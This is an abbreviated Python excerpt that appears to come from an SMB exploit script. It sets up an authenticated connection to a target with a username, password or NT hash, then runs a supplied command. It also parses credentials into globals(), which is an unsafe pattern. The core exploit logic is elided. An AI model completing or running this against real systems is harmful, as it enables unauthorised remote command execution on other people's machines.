...
def exploit(target, pipe_name, username, password, nthash, cmd):
	conn = MYSMB(target)
	...
	conn.login(username, password, nthash, maxBufferSize=4356)
...
globals()[secret.split(':',1)[0]] = secret.split(':', 1)[1]

if 'password' in globals():
    nthash=''

if 'nthash' in globals() and nthash != '':
    password=''
...
exploit(target, pipe_name, username, password, nthash, cmd)
print('Done')
